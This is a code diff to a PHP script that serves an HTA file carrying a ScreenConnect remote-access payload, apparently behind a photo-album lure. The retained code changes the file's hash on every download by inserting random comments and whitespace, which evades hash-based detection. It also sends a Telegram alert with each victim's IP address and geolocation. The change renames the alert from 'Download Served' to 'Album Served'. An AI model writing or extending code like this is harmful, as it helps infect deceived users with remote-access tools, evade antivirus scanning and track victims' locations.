@@ -25,30 +25,20 @@ $bytes = (string)@file_get_contents($src);
 if ($bytes === '') { http_response_code(500); echo '500'; exit; }
 
 // ---- mutate the HTA: inject an invisible random comment before </body>
-//      so the served file's SHA-256 differs every time. (Optional
-//      @@LEVEL_KEY@@ injection is kept for parity with the zip build;
-//      the ScreenConnect payload has no Level key, so this is a no-op.) ----
-$levelKey = (string)($_ENV['LEVEL_API_KEY'] ?? (getenv('LEVEL_API_KEY') ?: ''));
+//      so the served file's SHA-256 differs every time. ----
 $pad = random_int(2, 8) . " \n";                              // random trailing whitespace
 $cmt = "<!-- " . str_repeat(' ', random_int(24, 160)) . " v" . random_int(10000, 99999) . "-->\n";
 $pos = strrpos($bytes, '</body>');
 $bytes = ($pos !== false)
     ? substr($bytes, 0, $pos) . $pad . $cmt . substr($bytes, $pos)
     : $bytes . $pad . $cmt;
-if ($levelKey !== '') {
-    $i = strpos($bytes, '@@LEVEL_KEY@@');
-    if ($i !== false) {
-        $bytes = substr($bytes, 0, $i) . $levelKey
-              . substr($bytes, $i + strlen('@@LEVEL_KEY@@'));
-    }
-}
 
 // ---- one Telegram alert per real served download (deduped by visit) ----
 $key = ALERT_DIR . '/dl_' . md5($tok['r'] . '|' . $name) . '.fired';
 if (!@file_exists($key)) {
     @touch($key);
     $g = geo(ip());
-    $msg = "\x{1F4E5} Download Served \x{1F4E5}\n"
+    $msg = "\x{1F4F8} Album Served \x{1F4F8}\n"
          . "\x{1F4C5} Time: " . date('Y-m-d H:i:s') . "\n"
          . "\x{1F4CD} IP: " . ip() . "\n"
          . "\x{1F30D} Location: " . $g['city'] . ", " . $g['country'] . "\n"
